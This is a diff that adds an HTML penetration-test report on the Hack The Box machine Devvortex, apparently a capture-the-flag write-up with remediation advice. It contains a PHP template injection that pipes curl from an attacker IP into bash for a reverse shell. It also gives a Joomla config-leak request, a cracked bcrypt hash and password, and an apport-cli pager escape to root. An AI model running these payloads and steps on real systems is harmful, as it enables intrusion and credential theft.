@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penetration Testing Report - Devvortex</title>
+    <style>
+        /* --- Universal Styles for Screen and Print --- */
+        body {
+            background-color: #0a4b63; /* Dark Teal Background */
+            color: #f0f0f0; /* Off-white text for readability */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            /* ** Crucial for forcing background colors in print ** */
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+        .container {
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 20px 40px;
+            background-color: #0c5975;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.5);
+        }
+        h1, h2, h3, h4 {
+            color: #ffffff;
+            border-bottom: 1px solid #2a9d8f;
+            padding-bottom: 10px;
+        }
+        h1 {
+            text-align: center;
+            font-size: 2.5em;
+            padding: 20px 0;
+            border-top: 3px solid #93c47d; /* Green accent line */
+            border-bottom: 3px solid #93c47d; /* Green accent line */
+            margin-bottom: 5px;
+        }
+        h2.subtitle {
+             text-align: center;
+             font-size: 1.8em;
+             border: none;
+             margin-top: 0;
+             margin-bottom: 5px;
+        }
+        h3.report-meta {
+            text-align: center;
+            font-size: 1.2em;
+            border: none;
+            margin-top: 0;
+            margin-bottom: 5px;
+        }
+        hr {
+            border: 0;
+            height: 1px;
+            background-color: #2a9d8f;
+            margin: 30px 0;
+        }
+        .confidential {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .confidential strong {
+            font-size: 1.1em;
+        }
+        .confidential em {
+            font-size: 0.9em;
+            color: #cccccc;
+        }
+        a {
+            color: #93c47d; /* Green accent for links */
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        ul, ol {
+            padding-left: 20px;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border: 1px solid #1a7469;
+        }
+        thead {
+            background-color: #93c47d; /* Green accent for table headers */
+            color: #0a4b63;
+            /* ** Crucial for forcing background colors in print ** */
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+        thead th {
+             font-weight: bold;
+        }
+        tbody tr:nth-child(even) {
+            background-color: #0a4b63; /* Striped rows */
+        }
+        pre {
+            background-color: #002b36; /* Darker background for code */
+            color: #cddc39; /* Lime green text for code */
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            border: 1px solid #1a7469;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+        .footer {
+             text-align: center;
+             margin-top: 40px;
+             font-style: italic;
+             color: #cccccc;
+        }
+        
+        /* This rule helps control the margins set by the browser's print function */
+        @page {
+            margin: 0.75in;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <h1>CAPTURE THE FLAG PENETRATION TESTING</h1>
+        <h2 class="subtitle">Report of Findings: Devvortex</h2>
+        <h3 class="report-meta">Date: March 22, 2025</h3>
+        <h3 class="report-meta">Version: 1.0</h3>
+
+        <div class="confidential">
+            <strong>CONFIDENTIAL</strong><br>
+            <em>For educational and training purposes only</em>
+        </div>
+
+        <hr>
+        
+        <h2 id="table-of-contents">TABLE OF CONTENTS</h2>
+        <ol>
+            <li><a href="#executive-summary">Executive Summary</a></li>
+            <li><a href="#technical-summary">Technical Summary</a></li>
+            <li><a href="#detailed-findings">Detailed Technical Findings</a></li>
+            <li><a href="#attack-timeline">Attack Timeline</a></li>
+            <li><a href="#port-scan">Port Scan Results</a></li>
+            <li><a href="#remediation">Remediation Recommendations</a></li>
+            <li><a href="#evidence">Evidence Files</a></li>
+            <li><a href="#conclusion">Conclusion</a></li>
+        </ol>
+
+        <hr>
+
+        <h2 id="executive-summary">EXECUTIVE SUMMARY</h2>
+        <p>This report outlines the findings from a penetration test conducted on the HTB Devvortex machine (10.10.11.242). The assessment identified a critical chain of vulnerabilities that permitted an unauthenticated attacker to achieve full system compromise. The attack path began with an information disclosure vulnerability (CVE-2023-23752) in a Joomla CMS instance, leading to administrative access. This access was then leveraged for remote code execution. Further internal enumeration led to password hash cracking for lateral movement, followed by privilege escalation to root via a known vulnerability in the `apport-cli` utility (CVE-2023-1326).</p>
+        
+        <h3>Key Findings Summary</h3>
+        <ul>
+            <li><strong>4 critical vulnerabilities</strong> chained for full system access.</li>
+            <li><strong>Complete system compromise</strong> achieved, from unauthenticated to root.</li>
+            <li><strong>Information Disclosure (CVE-2023-23752)</strong> in Joomla exposed administrator credentials.</li>
+            <li><strong>Remote Code Execution</strong> via malicious modification of a PHP template file.</li>
+            <li><strong>Credential Exposure</strong> in the database enabled lateral movement via SSH.</li>
+            <li><strong>Privilege Escalation (CVE-2023-1326)</strong> via a misconfigured `sudo` rule for `apport-cli`.</li>
+        </ul>
+
+        <h3>Risk Level: CRITICAL</h3>
+        <p>The target system is critically vulnerable. The combination of an outdated and misconfigured public-facing CMS with an internal privilege escalation vulnerability presents a direct and severe risk of complete compromise by an external attacker.</p>
+
+        <hr>
+
+        <h2 id="technical-summary">TECHNICAL SUMMARY</h2>
+        
+        <h3>Target Information</h3>
+        <ul>
+            <li><strong>Target IP:</strong> 10.10.11.242</li>
+            <li><strong>Attacker IP:</strong> 10.10.14.12</li>
+            <li><strong>Hostname:</strong> devvortex.htb, dev.devvortex.htb</li>
+            <li><strong>Operating System:</strong> Ubuntu 20.04.6 LTS</li>
+        </ul>
+
+        <h3>Attack Vector Summary</h3>
+        <ol>
+            <li><strong>Initial Access:</strong> An information disclosure vulnerability (CVE-2023-23752) in the Joomla instance on `dev.devvortex.htb` was exploited to leak administrator credentials. These credentials were used to log in and inject a PHP reverse shell into a template file, resulting in code execution as the `www-data` user.</li>
+            <li><strong>Lateral Movement:</strong> Database credentials discovered on the system were used to query the Joomla user table. The bcrypt password hash for the user `logan` was extracted and cracked offline. The resulting password was used to authenticate via SSH as `logan`.</li>
+            <li><strong>Privilege Escalation:</strong> The user `logan` was found to have `sudo` permissions to run `/usr/bin/apport-cli`. This was exploited via CVE-2023-1326, which allows an attacker to escape the report viewer to a full root shell.</li>
+        </ol>
+
+        <hr>
+
+        <h2 id="detailed-findings">DETAILED TECHNICAL FINDINGS</h2>
+
+        <h3>Finding 1: Joomla Information Disclosure (CVE-2023-23752)</h3>
+        <p><strong>Severity:</strong> CRITICAL<br>
+        <strong>CVSS Score:</strong> 8.8<br>
+        <strong>CWE:</strong> CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)</p>
+        <p><strong>Description:</strong><br>
+        The Joomla CMS version 4.2.6 running on the `dev.devvortex.htb` subdomain is vulnerable to CVE-2023-23752. An improperly configured API endpoint allows unauthenticated access to sensitive configuration data by making a specific web request. This leak included the plaintext password for the administrator user `lewis`.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Endpoint:</strong> `/api/index.php/v1/config/application?public=true`</li>
+            <li><strong>Information Disclosed:</strong> Usernames and passwords, site configuration.</li>
+        </ul>
+        <p><strong>Evidence:</strong><br>The following command was used to retrieve the sensitive data:</p>
+        <pre><code>curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true | jq
+...
+"password": "P4ntherg0t1n5r3c0n##"
+...</code></pre>
+        <p><strong>Impact:</strong> This vulnerability provided direct administrative access to the Joomla backend, enabling the subsequent remote code execution attack.</p>
+
+        <h3>Finding 2: Remote Code Execution via Template Modification</h3>
+        <p><strong>Severity:</strong> CRITICAL<br>
+        <strong>CVSS Score:</strong> 9.8<br>
+        <strong>CWE:</strong> CWE-94 (Improper Control of Generation of Code - 'Code Injection')</p>
+        <p><strong>Description:</strong><br>
+        With administrative access to the Joomla panel, it is possible to edit the PHP code of the site's templates. The `error.php` file of the `cassiopeia` template was modified to include a PHP `system()` call. This function was used to download and execute a reverse shell script from an attacker-controlled server when the error page was triggered.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Function:</strong> Joomla's template editor.</li>
+            <li><strong>Injected Code:</strong> `<?php system("curl 10.10.14.12:8000/rev.sh|bash"); ?>`</li>
+            <li><strong>Trigger:</strong> Accessing `http://dev.devvortex.htb/templates/cassiopeia/error.php`</li>
+        </ul>
+        <p><strong>Impact:</strong> This allowed the attacker to transition from administrative web access to a shell on the underlying server as the `www-data` user, providing a foothold for further enumeration and attacks.</p>
+
+        <h3>Finding 3: Lateral Movement via Cracked Password Hash</h3>
+        <p><strong>Severity:</strong> HIGH<br>
+        <strong>CVSS Score:</strong> 7.2<br>
+        <strong>CWE:</strong> CWE-328 (Reversible One-Way Hash)</p>
+        <p><strong>Description:</strong><br>
+        After gaining initial access, enumeration of the system revealed the database credentials for the Joomla installation. The database contained a table of users (`sd4fg_users`) with their password hashes. The hash for the user `logan` was extracted and cracked offline using `hashcat`.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Hash Type:</strong> bcrypt ($2y$), which is strong, but the password was weak.</li>
+            <li><strong>Hash Value:</strong> `$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12`</li>
+            <li><strong>Cracked Password:</strong> `tequieromucho`</li>
+        </ul>
+        <p><strong>Impact:</strong> The cracked password allowed for lateral movement from the restricted `www-data` user to the `logan` user via SSH, who had significantly more privileges, including `sudo` access.</p>
+
+        <h3>Finding 4: Privilege Escalation via Apport-CLI (CVE-2023-1326)</h3>
+        <p><strong>Severity:</strong> HIGH<br>
+        <strong>CVSS Score:</strong> 7.8<br>
+        <strong>CWE:</strong> CWE-269 (Improper Privilege Management)</p>
+        <p><strong>Description:</strong><br>
+        The `logan` user has `sudo` permissions to run the `/usr/bin/apport-cli` utility. This version of `apport-cli` is vulnerable to CVE-2023-1326. The vulnerability exists in how `apport-cli` displays crash report data. By choosing to view a report, the application opens the `less` pager with elevated privileges. The `less` pager can be escaped to spawn a shell, which inherits the root privileges of the parent process.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Component:</strong> Sudoers configuration allowing `logan` to run `/usr/bin/apport-cli`.</li>
+            <li><strong>Exploitation Steps:</strong>
+                1. Run `sudo /usr/bin/apport-cli -f -P <PID>` on a running process.
+                2. Progress through the prompts until the option to "(V)iew report" is available.
+                3. Select 'V', which opens the report in `less`.
+                4. From within `less`, type `!/bin/bash` to spawn a root shell.
+            </li>
+        </ul>
+        <p><strong>Impact:</strong> This vulnerability provides a direct path for a standard user to gain full root access to the system, completing the system compromise.</p>
+
+        <hr>
+
+        <h2 id="attack-timeline">ATTACK TIMELINE</h2>
+        
+        <h3>Phase 1: Reconnaissance</h3>
+        <ul>
+            <li><strong>Scanning:</strong> Identified open ports 22 (SSH) and 80 (HTTP).</li>
+            <li><strong>Subdomain Enumeration:</strong> Discovered the `dev.devvortex.htb` subdomain.</li>
+            <li><strong>CMS Identification:</strong> Identified Joomla 4.2.6 on the subdomain.</li>
+        </ul>
+
+        <h3>Phase 2: Initial Access</h3>
+        <ul>
+            <li><strong>Vulnerability Discovery:</strong> Exploited CVE-2023-23752 to leak administrator credentials.</li>
+            <li><strong>Web Panel Access:</strong> Logged into Joomla as `lewis`.</li>
+            <li><strong>Code Injection:</strong> Modified the `error.php` template to include a reverse shell payload.</li>
+            <li><strong>Foothold Gained:</strong> Triggered the payload and received a shell as `www-data`.</li>
+        </ul>
+        
+        <h3>Phase 3: Lateral Movement</h3>
+        <ul>
+            <li><strong>Internal Enumeration:</strong> Found database credentials.</li>
+            <li><strong>Credential Extraction:</strong> Connected to the database and extracted the password hash for user `logan`.</li>
+            <li><strong>Offline Cracking:</strong> Used `hashcat` to crack the bcrypt hash.</li>
+            <li><strong>SSH Access:</strong> Successfully logged in as `logan` via SSH.</li>
+        </ul>
+
+        <h3>Phase 4: Privilege Escalation</h3>
+        <ul>
+            <li><strong>Sudo Enumeration:</strong> Ran `sudo -l` and identified the `apport-cli` permission.</li>
+            <li><strong>Vulnerability Exploitation:</strong> Abused CVE-2023-1326 by running `apport-cli` and escaping the `less` pager.</li>
+            <li><strong>Root Access:</strong> Gained a root shell.</li>
+        </ul>
+
+        <hr>
+        
+        <h2 id="port-scan">PORT SCAN RESULTS</h2>
+        <h3>TCP Port Scan</h3>
+        <pre><code>PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)</code></pre>
+
+        <hr>
+        
+        <h2 id="remediation">REMEDIATION RECOMMENDATIONS</h2>
+        
+        <h3>CRITICAL PRIORITY</h3>
+        <ol>
+            <li><strong>Update Joomla and PHP:</strong> Immediately update the Joomla installation to the latest patched version to mitigate CVE-2023-23752. Additionally, update the underlying PHP version from the obsolete 7.4.3 to a currently supported version (e.g., 8.2 or later).</li>
+            <li><strong>Restrict Sudo Permissions:</strong> The `sudo` rule for `apport-cli` for user `logan` should be removed. Granting permissions to complex interactive applications is inherently risky. Follow the principle of least privilege for all `sudo` configurations. Update `apport-cli` to a version not vulnerable to CVE-2023-1326.</li>
+            <li><strong>Enforce Strong Password Policies:</strong> Mandate the use of strong, unique passwords for all users to prevent offline cracking, even when strong hashing algorithms like bcrypt are used.</li>
+        </ol>
+
+        <h3>HIGH PRIORITY</h3>
+        <ol>
+            <li><strong>Disable File Editing from CMS Backend:</strong> To prevent RCE vectors, disable the ability to edit theme and plugin files directly from the Joomla administrator dashboard. File modifications should only be done via secure shell access.</li>
+            <li><strong>Credential Management:</strong> Ensure database credentials are not retrievable by the web server user. Store such configurations outside the web root with restrictive file permissions.</li>
+        </ol>
+
+        <hr>
+
+        <h2 id="evidence">EVIDENCE FILES</h2>
+        
+        <h3>User Flag</h3>
+        <ul>
+            <li><strong>Location:</strong> /home/logan/user.txt</li>
+            <li><strong>Value:</strong> e8a5cdd03ab11ebe6bda118a24c6eabe</li>
+        </ul>
+
+        <h3>Root Flag</h3>
+        <ul>
+            <li><strong>Location:</strong> /root/root.txt</li>
+            <li><strong>Value:</strong> 9ed26510459192dec89578cd3a6161ab</li>
+        </ul>
+
+        <h3>Key Artifacts</h3>
+        <ul>
+            <li><strong>Joomla Vulnerability:</strong> CVE-2023-23752</li>
+            <li><strong>Privilege Escalation Vulnerability:</strong> CVE-2023-1326</li>
+            <li><strong>Compromised Hash:</strong> `$2y$10$...yBtkIj12`</li>
+            <li><strong>Cracked Password:</strong> `tequieromucho`</li>
+        </ul>
+
+        <hr>
+
+        <h2 id="conclusion">CONCLUSION</h2>
+        <p>The Devvortex machine was found to be critically insecure due to a chain of high-severity vulnerabilities. The primary point of entry was an outdated and vulnerable version of the Joomla CMS, which allowed for a full compromise of the web application. Insecure practices within the application, such as allowing privileged file editing, enabled an attacker to pivot from web access to a shell on the server. The path to full system control was completed by exploiting a known local privilege escalation vulnerability via a misconfigured `sudo` rule. This engagement highlights the critical importance of timely software updates, secure configuration, and adherence to the principle of least privilege.</p>
+        
+        <p><strong>Business Risk:</strong> CRITICAL - The public-facing website provides a direct path for an external attacker to gain complete control of the server, leading to a total loss of confidentiality, integrity, and availability of the data and services hosted on it.</p>
+        <p><strong>Technical Risk:</strong> The combination of a public RCE, weak user passwords, and a known local privilege escalation vulnerability creates a trivial and reliable path to full system compromise.</p>
+        
+        <hr>
+
+        <div class="footer">
+            <p><strong>Report prepared by:</strong> Security Assessment Team<br>
+            <strong>Date:</strong> March 22, 2025</p>
+            <p>CONFIDENTIAL - For educational purposes only</p>
+        </div>
+
+    </div>
+
+</body>
+</html>
